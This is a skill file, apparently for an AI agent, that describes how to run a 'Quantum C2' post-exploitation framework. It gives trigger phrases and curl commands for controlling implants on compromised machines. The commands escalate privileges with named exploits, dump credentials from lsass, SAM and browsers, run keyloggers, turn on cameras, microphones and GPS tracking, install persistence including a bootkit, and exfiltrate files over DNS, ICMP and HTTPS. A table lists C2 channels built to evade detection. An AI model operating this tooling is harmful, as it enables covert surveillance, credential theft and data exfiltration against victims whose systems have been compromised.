---
name: quantum-c2-postex
description: >
  Post-exploitation and session management for Quantum C2. Use when the user needs to manage C2 sessions, execute commands on implants, perform privilege escalation, dump credentials, establish persistence, exfiltrate data, or conduct surveillance. Triggers on: "post-exploitation", "session management", "privilege escalation", "credential dump", "persistence", "data exfiltration", "keylogger", "screenshot", "surveillance", "implant commands", "lateral movement", "session execute".
---

# Quantum C2 Post-Exploitation Skill

Manage compromised sessions and execute post-exploitation operations.

## Session Management

### List All Sessions
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/
```

### Get Session Details
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/{session_id}
```

### Execute Command
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami && id && uname -a"}'
```

### Get Output
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/{id}/output
```

### Kill Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/kill \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Close Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/close \
  -H "Authorization: Bearer $C2_TOKEN"
```

### WebSocket Terminal
```
ws://localhost:8000/api/sessions/ws/{session_id}
```

## Privilege Escalation

### List Techniques
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/postex/privilege-escalation/techniques
```

### Execute Privilege Escalation
```bash
curl -X POST http://localhost:8000/api/postex/privilege-escalation \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess-abc123",
    "technique": "token_impersonation"
  }'
```

**Available Techniques:**
- `token_impersonation` — Windows token duplication
- `uac_bypass` — UAC bypass via CMSTP
- `registry_exploit` — Registry permission abuse
- `sudo_abuse` — Sudo misconfiguration
- `suid_abuse` — SUID binary exploitation
- `kernel_exploit` — CVE-2021-4034 (PwnKit)
- `dll_hijack` — DLL search order hijack
- `service_abuse` — Unquoted service path

## Credential Dumping

### Dump Credentials
```bash
curl -X POST http://localhost:8000/api/postex/credential-dump \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess-abc123",
    "target": "lsass"
  }'
```

**Targets:** `lsass`, `sam`, `shadow`, `browser`, `wifi`, `memory`

## Keylogger Operations

### Start Keylogger
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/keylogger/start \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Stop Keylogger
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/keylogger/stop \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Get Records
```bash
curl -H "Authorization: Bearer $C2_TOKEN" \
  http://localhost:8000/api/sessions/{id}/keylogger/records
```

## Surveillance

### Screenshot
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/screenshot \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Camera Activation (Device)
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"camera","camera":"front"}'
```

### Microphone Activation
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"microphone"}'
```

### GPS Location
```bash
curl -X POST http://localhost:8000/api/devices/{id}/gps \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Persistence Installation

### Create Persistence
```bash
curl -X POST http://localhost:8000/api/postex/persistence \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess-abc123",
    "method": "registry_run_key"
  }'
```

**Methods:** `registry_run_key`, `scheduled_task`, `service_install`, `startup_folder`, `wmi_event`, `dns_over_https`, `bootkit`

## Data Exfiltration

### Exfiltrate Data
```bash
curl -X POST http://localhost:8000/api/postex/exfiltration \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess-abc123",
    "source_path": "/home/user/secrets",
    "method": "https"
  }'
```

**Methods:** `https`, `dns`, `icmp`, `steganography`, `encrypted_archive`

## File Operations

### List Files
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la /tmp"}'
```

### Upload File
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/files/upload \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path":"/tmp/payload","data":"<base64_encoded>"}'
```

### Download File
```bash
curl -O http://localhost:8000/api/sessions/{id}/files/download/{path} \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Full Lifecycle Orchestration

### Execute Full Post-Exploitation Chain
```bash
curl -X POST http://localhost:8000/api/postex/full-lifecycle \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess-abc123",
    "objectives": ["privilege_escalation", "credential_dump", "persistence", "exfiltration"]
  }'
```

### Automation Workflow
```bash
curl -X POST http://localhost:8000/api/postex/automation/start \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess-abc123",
    "workflow": "full_pivot",
    "targets": ["192.168.1.0/24"],
    "objectives": ["lateral_movement", "persistence", "exfiltration"]
  }'
```

## Common Commands

### System Information
```bash
# Linux/macOS
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami; id; uname -a; hostname; hostname -f"}'

# Windows
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"systeminfo & net user & net group \"domain admins\""}'
```

### Network Recon from Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ip addr; netstat -tulpn; route -n"}'
```

### Process Enumeration
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ps aux; top -b -n 1"}'
```

## Session Data Model

```python
SessionInfo {
    session_id: str           # sess-{12hex}
    target_ip: str
    target_port: int
    platform: str             # windows/linux/macos/android/ios
    status: str               # active/inactive/closed
    connected_at: float
    last_activity: float
    hostname: str
    username: str
    architecture: str
    process_id: int
    privilege: str            # user/admin/root
    bytes_sent: int
    bytes_recv: int
    working_dir: str
    keylogger_active: bool
}
```

## C2 Channel Types

| Channel | Protocol | Evasion |
|---------|----------|---------|
| HTTPChannel | HTTPS | Randomized UA, Referer, Paths |
| DNSChannel | DNS | Base64 subdomain queries |
| TelegramChannel | Bot API | Consumer app traffic |
| IRCChannel | SSL socket | Chat protocol camouflage |
| SlackChannel | Bot API | Enterprise app blending |
| TLSChannel | mTLS | Certificate pinning |
